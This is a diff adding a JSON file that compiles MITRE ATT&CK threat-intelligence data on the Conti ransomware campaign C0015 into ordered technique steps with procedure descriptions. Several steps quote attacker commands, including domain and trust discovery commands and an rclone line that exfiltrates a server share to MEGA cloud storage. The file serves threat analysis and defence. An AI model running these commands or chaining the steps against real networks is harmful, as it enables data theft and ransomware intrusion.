@@ -1,0 +1,772 @@
+{
+  "schema_version": "1",
+  "compiler_version": "1",
+  "campaign_id": "C0015",
+  "campaign_name": "C0015",
+  "source": {
+    "bundle_sha256": "dc1639caa5501d720e280cf1cbd8fbe009884a0c9b3e6e9ed9d0c25166c3d8f4",
+    "object_count": 26086,
+    "campaign_stix_id": "campaign--78068e68-4124-4243-b6f4-76e4e5be8a06",
+    "campaign_external_id": "C0015"
+  },
+  "ordering_policy": "tactic_rank_then_technique_id",
+  "steps": [
+    {
+      "technique_id": "T1588.001",
+      "technique_stix_id": "attack-pattern--7807d3a4-a885-4639-a786-c1ed41484970",
+      "name": "Malware",
+      "execution_domain": "attacker",
+      "tactics": [
+        "resource-development"
+      ],
+      "platforms": [
+        "PRE"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--bfb6dc5a-786f-47e8-ab9c-848a643df423"
+      ],
+      "procedure_descriptions": [
+        "For [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors used [Cobalt Strike](https://attack.mitre.org/software/S0154) and [Conti](https://attack.mitre.org/software/S0575) ransomware.(Citation: DFIR Conti Bazar Nov 2021) "
+      ]
+    },
+    {
+      "technique_id": "T1588.002",
+      "technique_stix_id": "attack-pattern--a2fdce72-04b2-409a-ac10-cc1695f4fce0",
+      "name": "Tool",
+      "execution_domain": "attacker",
+      "tactics": [
+        "resource-development"
+      ],
+      "platforms": [
+        "PRE"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--e9ff50dd-6367-43b1-9f75-1dee4028df84"
+      ],
+      "procedure_descriptions": [
+        "For [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors obtained a variety of tools, including [AdFind](https://attack.mitre.org/software/S0552),  AnyDesk, and Process Hacker.(Citation: DFIR Conti Bazar Nov 2021)"
+      ]
+    },
+    {
+      "technique_id": "T1566.001",
+      "technique_stix_id": "attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597",
+      "name": "Spearphishing Attachment",
+      "execution_domain": "boundary",
+      "tactics": [
+        "initial-access"
+      ],
+      "platforms": [
+        "Linux",
+        "Windows",
+        "macOS"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--538eb3a4-466e-42d0-9f12-bd9b6de0abe4"
+      ],
+      "procedure_descriptions": [
+        "For [C0015](https://attack.mitre.org/campaigns/C0015), security researchers assessed the threat actors likely used a phishing campaign to distribute a weaponized attachment to victims.(Citation: DFIR Conti Bazar Nov 2021)"
+      ]
+    },
+    {
+      "technique_id": "T1047",
+      "technique_stix_id": "attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055",
+      "name": "Windows Management Instrumentation",
+      "execution_domain": "target",
+      "tactics": [
+        "execution"
+      ],
+      "platforms": [
+        "Windows"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--0a764574-6288-4f66-b4af-b485424b32d2"
+      ],
+      "procedure_descriptions": [
+        "During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors used `wmic` and `rundll32` to load [Cobalt Strike](https://attack.mitre.org/software/S0154) onto a target host.(Citation: DFIR Conti Bazar Nov 2021)"
+      ]
+    },
+    {
+      "technique_id": "T1059.003",
+      "technique_stix_id": "attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62",
+      "name": "Windows Command Shell",
+      "execution_domain": "target",
+      "tactics": [
+        "execution"
+      ],
+      "platforms": [
+        "Windows"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--b6129b4d-09bd-46f6-b7c4-1500b0e61535"
+      ],
+      "procedure_descriptions": [
+        "During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors used `cmd.exe` to execute commands and run malicious binaries.(Citation: DFIR Conti Bazar Nov 2021)"
+      ]
+    },
+    {
+      "technique_id": "T1059.005",
+      "technique_stix_id": "attack-pattern--dfd7cc1d-e1d8-4394-a198-97c4cab8aa67",
+      "name": "Visual Basic",
+      "execution_domain": "target",
+      "tactics": [
+        "execution"
+      ],
+      "platforms": [
+        "Linux",
+        "Windows",
+        "macOS"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--7d2c1704-b190-4b47-854c-5c1e122fa5ce"
+      ],
+      "procedure_descriptions": [
+        "During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors used a malicious HTA file that contained a mix of HTML and JavaScript/VBScript code.(Citation: DFIR Conti Bazar Nov 2021)"
+      ]
+    },
+    {
+      "technique_id": "T1059.007",
+      "technique_stix_id": "attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d",
+      "name": "JavaScript",
+      "execution_domain": "target",
+      "tactics": [
+        "execution"
+      ],
+      "platforms": [
+        "Linux",
+        "Windows",
+        "macOS"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--eb2b318e-2968-485e-8459-1b40c74baf83"
+      ],
+      "procedure_descriptions": [
+        "During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors used a malicious HTA file that contained a mix of encoded HTML and JavaScript/VBScript code.(Citation: DFIR Conti Bazar Nov 2021)"
+      ]
+    },
+    {
+      "technique_id": "T1204.002",
+      "technique_stix_id": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e",
+      "name": "Malicious File",
+      "execution_domain": "target",
+      "tactics": [
+        "execution"
+      ],
+      "platforms": [
+        "Linux",
+        "Windows",
+        "macOS"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--4a98aeee-5b53-43ca-a75a-5839792756d7"
+      ],
+      "procedure_descriptions": [
+        "During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors relied on users to enable macros within a malicious Microsoft Word document.(Citation: DFIR Conti Bazar Nov 2021)"
+      ]
+    },
+    {
+      "technique_id": "T1055.001",
+      "technique_stix_id": "attack-pattern--f4599aa0-4f85-4a32-80ea-fc39dc965945",
+      "name": "Dynamic-link Library Injection",
+      "execution_domain": "target",
+      "tactics": [
+        "privilege-escalation",
+        "stealth"
+      ],
+      "platforms": [
+        "Windows"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--74afa3c9-bfa3-48a3-85bf-b28e5ecd00b7"
+      ],
+      "procedure_descriptions": [
+        "During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors used a DLL named `D8B3.dll` that was injected into the Winlogon process.(Citation: DFIR Conti Bazar Nov 2021) "
+      ]
+    },
+    {
+      "technique_id": "T1027",
+      "technique_stix_id": "attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a",
+      "name": "Obfuscated Files or Information",
+      "execution_domain": "target",
+      "tactics": [
+        "stealth"
+      ],
+      "platforms": [
+        "ESXi",
+        "Linux",
+        "Network Devices",
+        "Windows",
+        "macOS"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--a81df141-ff2a-4be9-a6ea-c5b19d29bc0e"
+      ],
+      "procedure_descriptions": [
+        "During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors used Base64-encoded strings.(Citation: DFIR Conti Bazar Nov 2021)"
+      ]
+    },
+    {
+      "technique_id": "T1036",
+      "technique_stix_id": "attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0",
+      "name": "Masquerading",
+      "execution_domain": "target",
+      "tactics": [
+        "stealth"
+      ],
+      "platforms": [
+        "Containers",
+        "ESXi",
+        "Linux",
+        "Windows",
+        "macOS"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--f2a58ddd-c9d8-4769-a93b-2e876e304105"
+      ],
+      "procedure_descriptions": [
+        "During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors named a binary file `compareForfor.jpg` to disguise it as a JPG file.(Citation: DFIR Conti Bazar Nov 2021)"
+      ]
+    },
+    {
+      "technique_id": "T1218.005",
+      "technique_stix_id": "attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade",
+      "name": "Mshta",
+      "execution_domain": "target",
+      "tactics": [
+        "stealth"
+      ],
+      "platforms": [
+        "Windows"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--ff9fad0d-7481-4804-a4e8-800265a5c17d"
+      ],
+      "procedure_descriptions": [
+        "During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors used `mshta` to execute DLLs.(Citation: DFIR Conti Bazar Nov 2021)"
+      ]
+    },
+    {
+      "technique_id": "T1218.010",
+      "technique_stix_id": "attack-pattern--b97f1d35-4249-4486-a6b5-ee60ccf24fab",
+      "name": "Regsvr32",
+      "execution_domain": "target",
+      "tactics": [
+        "stealth"
+      ],
+      "platforms": [
+        "Windows"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--bcbf0e6a-3566-4704-986f-caf0af38741d"
+      ],
+      "procedure_descriptions": [
+        "During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors employed code that used `regsvr32` for execution.(Citation: DFIR Conti Bazar Nov 2021)"
+      ]
+    },
+    {
+      "technique_id": "T1218.011",
+      "technique_stix_id": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
+      "name": "Rundll32",
+      "execution_domain": "target",
+      "tactics": [
+        "stealth"
+      ],
+      "platforms": [
+        "Windows"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--511ed53b-8445-4da7-8890-49d1b4e98077"
+      ],
+      "procedure_descriptions": [
+        "During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors loaded DLLs via `rundll32` using the `svchost` process.(Citation: DFIR Conti Bazar Nov 2021)"
+      ]
+    },
+    {
+      "technique_id": "T1553.002",
+      "technique_stix_id": "attack-pattern--32901740-b42c-4fdd-bc02-345b5dc57082",
+      "name": "Code Signing",
+      "execution_domain": "target",
+      "tactics": [
+        "defense-impairment"
+      ],
+      "platforms": [
+        "Windows",
+        "macOS"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--356744ba-4a64-4ada-9c95-6cdc4e539614"
+      ],
+      "procedure_descriptions": [
+        "For [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors used DLL files that had invalid certificates.(Citation: DFIR Conti Bazar Nov 2021)"
+      ]
+    },
+    {
+      "technique_id": "T1016",
+      "technique_stix_id": "attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0",
+      "name": "System Network Configuration Discovery",
+      "execution_domain": "target",
+      "tactics": [
+        "discovery"
+      ],
+      "platforms": [
+        "ESXi",
+        "Linux",
+        "Network Devices",
+        "Windows",
+        "macOS"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--e8312c6b-a855-48c4-b5cc-8e369bcfd475"
+      ],
+      "procedure_descriptions": [
+        "During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors used code to obtain the external public-facing IPv4 address of the compromised host.(Citation: DFIR Conti Bazar Nov 2021) "
+      ]
+    },
+    {
+      "technique_id": "T1018",
+      "technique_stix_id": "attack-pattern--e358d692-23c0-4a31-9eb6-ecc13a8d7735",
+      "name": "Remote System Discovery",
+      "execution_domain": "target",
+      "tactics": [
+        "discovery"
+      ],
+      "platforms": [
+        "ESXi",
+        "Linux",
+        "Network Devices",
+        "Windows",
+        "macOS"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--e79f7f56-3a5e-4957-8070-360f630f3c2e"
+      ],
+      "procedure_descriptions": [
+        "During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors used the commands `net view /all /domain` and `ping` to discover remote systems. They also used PowerView's PowerShell Invoke-ShareFinder script for file share enumeration.(Citation: DFIR Conti Bazar Nov 2021)"
+      ]
+    },
+    {
+      "technique_id": "T1057",
+      "technique_stix_id": "attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580",
+      "name": "Process Discovery",
+      "execution_domain": "target",
+      "tactics": [
+        "discovery"
+      ],
+      "platforms": [
+        "ESXi",
+        "Linux",
+        "Network Devices",
+        "Windows",
+        "macOS"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--5b0329a9-aebd-4216-94d8-a39021139b80"
+      ],
+      "procedure_descriptions": [
+        "During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors used the `tasklist /s` command as well as `taskmanager` to obtain a list of running processes.(Citation: DFIR Conti Bazar Nov 2021)"
+      ]
+    },
+    {
+      "technique_id": "T1069.001",
+      "technique_stix_id": "attack-pattern--a01bf75f-00b2-4568-a58f-565ff9bf202b",
+      "name": "Local Groups",
+      "execution_domain": "target",
+      "tactics": [
+        "discovery"
+      ],
+      "platforms": [
+        "Linux",
+        "Windows",
+        "macOS"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--5968f7a6-a300-4a1b-9a4e-655e9300392b"
+      ],
+      "procedure_descriptions": [
+        "During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors used the command `net localgroup \"adminstrator\" ` to identify accounts with local administrator rights.(Citation: DFIR Conti Bazar Nov 2021)"
+      ]
+    },
+    {
+      "technique_id": "T1069.002",
+      "technique_stix_id": "attack-pattern--2aed01ad-3df3-4410-a8cb-11ea4ded587c",
+      "name": "Domain Groups",
+      "execution_domain": "target",
+      "tactics": [
+        "discovery"
+      ],
+      "platforms": [
+        "Linux",
+        "Windows",
+        "macOS"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--6317e636-4766-4968-ac4b-66b1a7199250"
+      ],
+      "procedure_descriptions": [
+        "During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors use the command `net group \"domain admins\" /dom` to enumerate domain groups.(Citation: DFIR Conti Bazar Nov 2021)"
+      ]
+    },
+    {
+      "technique_id": "T1083",
+      "technique_stix_id": "attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18",
+      "name": "File and Directory Discovery",
+      "execution_domain": "target",
+      "tactics": [
+        "discovery"
+      ],
+      "platforms": [
+        "ESXi",
+        "Linux",
+        "Network Devices",
+        "Windows",
+        "macOS"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--135fb6c4-1f42-42ce-b323-22e57ae4fbc6"
+      ],
+      "procedure_descriptions": [
+        "During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors conducted a file listing discovery against multiple hosts to ensure locker encryption was successful.(Citation: DFIR Conti Bazar Nov 2021)"
+      ]
+    },
+    {
+      "technique_id": "T1124",
+      "technique_stix_id": "attack-pattern--f3c544dc-673c-4ef3-accb-53229f1ae077",
+      "name": "System Time Discovery",
+      "execution_domain": "target",
+      "tactics": [
+        "discovery"
+      ],
+      "platforms": [
+        "ESXi",
+        "Linux",
+        "Network Devices",
+        "Windows",
+        "macOS"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--c5e582d2-aea4-4828-8b9c-5bfe1ca72504"
+      ],
+      "procedure_descriptions": [
+        "During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors used the command `net view /all time` to gather the local time of a compromised network.(Citation: DFIR Conti Bazar Nov 2021)"
+      ]
+    },
+    {
+      "technique_id": "T1135",
+      "technique_stix_id": "attack-pattern--3489cfc5-640f-4bb3-a103-9137b97de79f",
+      "name": "Network Share Discovery",
+      "execution_domain": "target",
+      "tactics": [
+        "discovery"
+      ],
+      "platforms": [
+        "Linux",
+        "Windows",
+        "macOS"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--05c33a7a-bfd0-4374-a617-f2c407461acb"
+      ],
+      "procedure_descriptions": [
+        "During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors executed the PowerView ShareFinder module to identify open shares.(Citation: DFIR Conti Bazar Nov 2021)"
+      ]
+    },
+    {
+      "technique_id": "T1482",
+      "technique_stix_id": "attack-pattern--767dbf9e-df3f-45cb-8998-4903ab5f80c0",
+      "name": "Domain Trust Discovery",
+      "execution_domain": "target",
+      "tactics": [
+        "discovery"
+      ],
+      "platforms": [
+        "Windows"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--fc3d0026-20b2-4d38-b276-64d7290c1994"
+      ],
+      "procedure_descriptions": [
+        "During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors used the command `nltest /domain_trusts /all_trusts` to enumerate domain trusts.(Citation: DFIR Conti Bazar Nov 2021)"
+      ]
+    },
+    {
+      "technique_id": "T1021.001",
+      "technique_stix_id": "attack-pattern--eb062747-2193-45de-8fa2-e62549c37ddf",
+      "name": "Remote Desktop Protocol",
+      "execution_domain": "target",
+      "tactics": [
+        "lateral-movement"
+      ],
+      "platforms": [
+        "Windows"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--c4275eb1-4651-4c47-bc14-82a4b7ceec2b"
+      ],
+      "procedure_descriptions": [
+        "During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors used RDP to access specific network hosts of interest.(Citation: DFIR Conti Bazar Nov 2021)"
+      ]
+    },
+    {
+      "technique_id": "T1570",
+      "technique_stix_id": "attack-pattern--bf90d72c-c00b-45e3-b3aa-68560560d4c5",
+      "name": "Lateral Tool Transfer",
+      "execution_domain": "target",
+      "tactics": [
+        "lateral-movement"
+      ],
+      "platforms": [
+        "ESXi",
+        "Linux",
+        "Windows",
+        "macOS"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--e7187197-205f-496f-b41c-34d57c52a997"
+      ],
+      "procedure_descriptions": [
+        "During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors used WMI to load [Cobalt Strike](https://attack.mitre.org/software/S0154) onto additional hosts within a compromised network.(Citation: DFIR Conti Bazar Nov 2021)"
+      ]
+    },
+    {
+      "technique_id": "T1005",
+      "technique_stix_id": "attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5",
+      "name": "Data from Local System",
+      "execution_domain": "target",
+      "tactics": [
+        "collection"
+      ],
+      "platforms": [
+        "ESXi",
+        "Linux",
+        "Network Devices",
+        "Windows",
+        "macOS"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--576f0fb4-4cd7-467b-9208-3977321705e4"
+      ],
+      "procedure_descriptions": [
+        "During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors obtained files and data from the compromised network.(Citation: DFIR Conti Bazar Nov 2021)"
+      ]
+    },
+    {
+      "technique_id": "T1039",
+      "technique_stix_id": "attack-pattern--ae676644-d2d2-41b7-af7e-9bed1b55898c",
+      "name": "Data from Network Shared Drive",
+      "execution_domain": "target",
+      "tactics": [
+        "collection"
+      ],
+      "platforms": [
+        "Linux",
+        "Windows",
+        "macOS"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--d3720380-6d0d-41a9-a2b5-e0fcc311f486"
+      ],
+      "procedure_descriptions": [
+        "During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors collected files from network shared drives prior to network encryption.(Citation: DFIR Conti Bazar Nov 2021)"
+      ]
+    },
+    {
+      "technique_id": "T1074.001",
+      "technique_stix_id": "attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c",
+      "name": "Local Data Staging",
+      "execution_domain": "target",
+      "tactics": [
+        "collection"
+      ],
+      "platforms": [
+        "ESXi",
+        "Linux",
+        "Windows",
+        "macOS"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--4dcb70d9-017b-44b8-a13c-fab275c5bc56"
+      ],
+      "procedure_descriptions": [
+        "During [C0015](https://attack.mitre.org/campaigns/C0015), PowerView's file share enumeration results were stored in the file `c:\\ProgramData\\found_shares.txt`.(Citation: DFIR Conti Bazar Nov 2021)"
+      ]
+    },
+    {
+      "technique_id": "T1105",
+      "technique_stix_id": "attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add",
+      "name": "Ingress Tool Transfer",
+      "execution_domain": "boundary",
+      "tactics": [
+        "command-and-control"
+      ],
+      "platforms": [
+        "ESXi",
+        "Linux",
+        "Network Devices",
+        "Windows",
+        "macOS"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--69bfbe2b-2a2a-4013-9fba-7a551ec75836"
+      ],
+      "procedure_descriptions": [
+        "During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors downloaded additional tools and files onto a compromised network.(Citation: DFIR Conti Bazar Nov 2021)"
+      ]
+    },
+    {
+      "technique_id": "T1219.002",
+      "technique_stix_id": "attack-pattern--d4287702-e2f7-4946-bdfa-2c7f5aaa5032",
+      "name": "Remote Desktop Software",
+      "execution_domain": "boundary",
+      "tactics": [
+        "command-and-control"
+      ],
+      "platforms": [
+        "Linux",
+        "Windows",
+        "macOS"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--d35f97c3-2776-4f7a-9dfa-be39009ea5c0"
+      ],
+      "procedure_descriptions": [
+        "During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors installed the AnyDesk remote desktop application onto the compromised network.(Citation: DFIR Conti Bazar Nov 2021)"
+      ]
+    },
+    {
+      "technique_id": "T1030",
+      "technique_stix_id": "attack-pattern--c3888c54-775d-4b2f-b759-75a2ececcbfd",
+      "name": "Data Transfer Size Limits",
+      "execution_domain": "boundary",
+      "tactics": [
+        "exfiltration"
+      ],
+      "platforms": [
+        "ESXi",
+        "Linux",
+        "Windows",
+        "macOS"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--ca476de5-e17e-4011-9e5b-b438299c385c"
+      ],
+      "procedure_descriptions": [
+        "During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors limited [Rclone](https://attack.mitre.org/software/S1040)'s bandwidth setting during exfiltration.(Citation: DFIR Conti Bazar Nov 2021) "
+      ]
+    },
+    {
+      "technique_id": "T1567.002",
+      "technique_stix_id": "attack-pattern--bf1b6176-597c-4600-bfcd-ac989670f96b",
+      "name": "Exfiltration to Cloud Storage",
+      "execution_domain": "boundary",
+      "tactics": [
+        "exfiltration"
+      ],
+      "platforms": [
+        "ESXi",
+        "Linux",
+        "Windows",
+        "macOS"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--3d4490e3-d3fe-4c2e-8c41-69ebbf8d060e"
+      ],
+      "procedure_descriptions": [
+        "During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors exfiltrated files and sensitive data to the MEGA cloud storage site using the [Rclone](https://attack.mitre.org/software/S1040) command `rclone.exe copy --max-age 2y \"\\\\SERVER\\Shares\" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M`.(Citation: DFIR Conti Bazar Nov 2021)"
+      ]
+    },
+    {
+      "technique_id": "T1486",
+      "technique_stix_id": "attack-pattern--b80d107d-fa0d-4b60-9684-b0433e8bdba0",
+      "name": "Data Encrypted for Impact",
+      "execution_domain": "target",
+      "tactics": [
+        "impact"
+      ],
+      "platforms": [
+        "ESXi",
+        "IaaS",
+        "Linux",
+        "Windows",
+        "macOS"
+      ],
+      "permissions_required": [],
+      "system_requirements": [],
+      "relationship_ids": [
+        "relationship--89bd9b10-f1cb-4569-977c-784cbfbb23e1"
+      ],
+      "procedure_descriptions": [
+        "During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors used [Conti](https://attack.mitre.org/software/S0575) ransomware to encrypt a compromised network.(Citation: DFIR Conti Bazar Nov 2021)"
+      ]
+    }
+  ],
+  "limitations": [
+    "ATT&CK uses-links do not encode a historical total order; the compiler applies a declared tactic-rank policy.",
+    "Technique metadata constrains procedures but does not uniquely determine an executable target environment."
+  ],
+  "content_sha256": "6eb5675287bad25cb962fdb4f17c120fec4f02bcb36f92fcaad1d8f0eb71b90d"
+}
